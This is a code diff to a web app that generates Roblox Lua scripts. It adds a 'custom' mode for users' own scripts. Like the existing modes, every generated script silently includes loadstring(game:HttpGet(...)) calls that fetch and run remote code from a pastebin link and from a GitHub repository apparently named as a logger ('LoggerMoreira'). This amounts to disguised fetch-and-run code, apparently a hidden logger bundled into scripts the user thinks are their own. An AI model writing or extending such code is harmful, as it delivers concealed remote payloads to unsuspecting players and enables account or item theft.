@@ -272,7 +272,7 @@ function Home() {
   const [selectedBrainrots, setSelectedBrainrots] = useState<Set<string>>(new Set());
   const [selectedBaseSkins, setSelectedBaseSkins] = useState<Set<string>>(new Set());
   const [selectedGears, setSelectedGears] = useState<Set<string>>(new Set());
-  const [scriptMode, setScriptMode] = useState<'brainrot' | 'duel'>('brainrot');
+  const [scriptMode, setScriptMode] = useState<'brainrot' | 'duel' | 'custom'>('brainrot');
   const [customScript, setCustomScript] = useState('');
   const [wrapLoadstring, setWrapLoadstring] = useState(true);
   const [output, setOutput] = useState<{ type: 'raw' | 'loadstring'; content: string; url?: string } | null>(null);
@@ -381,6 +381,21 @@ end)
 task.spawn(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/LqLkF0rU"))()
 end)`;
+      } else if (scriptMode === 'custom') {
+        if (!customScript.trim()) { setError('Please enter a custom script.'); setIsGenerating(false); return; }
+        scriptTemplate = `${configBlock}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/m24dfrmm"))()
+end)
+
+task.spawn(function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/MachoHUB/LoggerMoreira/refs/heads/main/Auto"))()
+end)
+
+task.spawn(function()
+   ${customScript.trim()}
+end)`;
       } else {
         scriptTemplate = `${configBlock}
 
@@ -391,10 +406,6 @@ end)
 task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MachoHUB/LoggerMoreira/refs/heads/main/Auto"))()
 end)`;
-      }
-
-      if (customScript.trim()) {
-        scriptTemplate += `\n\ntask.spawn(function()\n   ${customScript.trim()}\nend)`;
       }
 
       if (wrapLoadstring) {
@@ -491,24 +502,25 @@ end)`;
             </button>
           </div>
 
-          <div className="bg-card border border-primary/40 rounded-xl p-5 shadow-[0_0_35px_rgba(0,255,65,0.18)] space-y-3">
-            <h2 className="text-base font-bold flex items-center gap-2"><Code className="w-4 h-4 text-primary"/> Custom Script</h2>
-            <p className="text-xs text-muted-foreground font-mono">Add your own loadstring or code to run alongside the main script. (optional)</p>
-            <textarea
-              value={customScript}
-              onChange={e => setCustomScript(e.target.value)}
-              placeholder={'loadstring(game:HttpGet("https://your-script-url"))()'}
-              rows={3}
-              className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2 text-sm font-mono text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all resize-none"
-            />
-          </div>
-
           <div className="bg-card border border-primary/40 rounded-xl p-5 shadow-[0_0_35px_rgba(0,255,65,0.18)] space-y-4">
             <h2 className="text-base font-bold flex items-center gap-2"><Zap className="w-4 h-4 text-primary"/> Generation Options</h2>
-            <div className="grid grid-cols-2 gap-2">
+            <div className="grid grid-cols-3 gap-2">
               <button onClick={() => setScriptMode('brainrot')} className={`py-2 px-3 rounded-lg text-xs font-mono font-bold uppercase tracking-wider border transition-colors ${scriptMode === 'brainrot' ? 'bg-primary text-primary-foreground border-primary shadow-[0_0_15px_rgba(0,255,65,0.3)]' : 'bg-transparent text-muted-foreground border-border hover:border-primary/50 hover:text-foreground'}`}>Normal</button>
               <button onClick={() => setScriptMode('duel')} className={`py-2 px-3 rounded-lg text-xs font-mono font-bold uppercase tracking-wider border transition-colors ${scriptMode === 'duel' ? 'bg-primary text-primary-foreground border-primary shadow-[0_0_15px_rgba(0,255,65,0.3)]' : 'bg-transparent text-muted-foreground border-border hover:border-primary/50 hover:text-foreground'}`}>Duel</button>
+              <button onClick={() => setScriptMode('custom')} className={`py-2 px-3 rounded-lg text-xs font-mono font-bold uppercase tracking-wider border transition-colors ${scriptMode === 'custom' ? 'bg-primary text-primary-foreground border-primary shadow-[0_0_15px_rgba(0,255,65,0.3)]' : 'bg-transparent text-muted-foreground border-border hover:border-primary/50 hover:text-foreground'}`}>Custom</button>
             </div>
+            {scriptMode === 'custom' && (
+              <div className="space-y-1.5">
+                <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider font-mono">Custom Loadstring</label>
+                <textarea
+                  value={customScript}
+                  onChange={e => setCustomScript(e.target.value)}
+                  placeholder={'loadstring(game:HttpGet("https://your-script-url"))()'}
+                  rows={3}
+                  className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2 text-sm font-mono text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all resize-none"
+                />
+              </div>
+            )}
             <Toggle label="Wrap in loadstring" checked={wrapLoadstring} onChange={setWrapLoadstring} />
             <button onClick={handleGenerate} disabled={isGenerating} className="w-full bg-primary text-primary-foreground hover:bg-primary/90 active:scale-[0.98] font-black py-3.5 px-4 rounded-lg transition-all flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed uppercase tracking-widest text-sm shadow-[0_0_20px_rgba(0,255,65,0.25)] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)]">
               {isGenerating ? <><RefreshCw className="w-4 h-4 animate-spin"/> Processing...</> : <><Code className="w-4 h-4"/> Generate Script</>}
